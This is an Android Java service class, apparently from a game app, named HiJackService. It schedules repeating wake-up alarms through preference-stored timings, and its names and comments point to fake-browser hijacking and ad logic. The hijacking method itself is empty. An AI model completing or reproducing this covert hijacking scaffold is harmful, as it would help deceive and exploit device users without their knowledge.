package cn.com.tiantong.game72;

import java.util.HashMap;

import cn.com.tiantong.game72.util.Logger;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.util.Log;

public class HiJackService extends Service {
	
	private static final String TAG = "HiJackService";
	
	public static final String PREFS_NAME = "FakeBrowserService";
	public static final String SERVICE_ACTION = "cn.com.tiantong.game70.HiJackService";
	public static final String WAIT_TIME = "FakeBrowserAlarmWaitTime";
	public static final String START_TIME = "FakeBrowserStartTime";
	public static final String END_TIME = "FakeBrowserEndTime";
	public static final String START = "StartDoFake";
	public static final String END = "FinishDoFake";
	public static final String STATUS = "status";

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		
        Logger.print(TAG, "-----------");
		
		SharedPreferences preferences = this.getSharedPreferences(HiJackService.PREFS_NAME, 0);// PreferenceManager.getDefaultSharedPreferences(this);
		SharedPreferences.Editor editor = preferences.edit();

		long waitTime = preferences.getLong(WAIT_TIME, 0);
		String status = preferences.getString(STATUS, "0");
		long startTime = preferences.getLong(START_TIME, 0);

		Logger.print(TAG, "waitTime : " + waitTime + ", status : " + status + ", startTime : " + startTime);
		
		// 定义一个闹钟
		Intent alarmIntent = new Intent(HiJackService.this, ControlBroadcastReceiver.class);
		alarmIntent.setAction(HiJackService.SERVICE_ACTION);
		// 给alarmIntent 设置状态标识
		// alarmIntent.addFlags(status);

		alarmIntent.setType(status);

		PendingIntent pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, alarmIntent, PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager alarmManager = (AlarmManager) getApplication().getSystemService(ALARM_SERVICE);

		if (startTime > 0) {
			
			if (System.currentTimeMillis() <= startTime) {
				Logger.print(TAG, " -- 1");
				alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, startTime, startTime - System.currentTimeMillis(), pendingIntent);

			} else if (System.currentTimeMillis() >= startTime && System.currentTimeMillis() < (startTime + waitTime)) {
				Logger.print(TAG, " -- 2");
				if (ControlBroadcastReceiver.adsBean != null) {
					Logger.print(TAG, " -- 3");
					alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, startTime, (startTime + waitTime) - System.currentTimeMillis(), pendingIntent);
					Logger.print(TAG, "--等待时间:" + (startTime + waitTime));
				}
			} else {
				Logger.print(TAG, " -- 4");
				alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), System.currentTimeMillis() + startTime, pendingIntent);
			}
		} else {
			Logger.print(TAG, " -- 5");
			Logger.print("HiJackService:", "初始化启动!");
		}
		
		return super.onStartCommand(intent, flags, startId);
	}

	// 执行具体的劫持逻辑
	public void doFakeBrowser(HashMap<String, Object> targetMap) {

	}

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

}
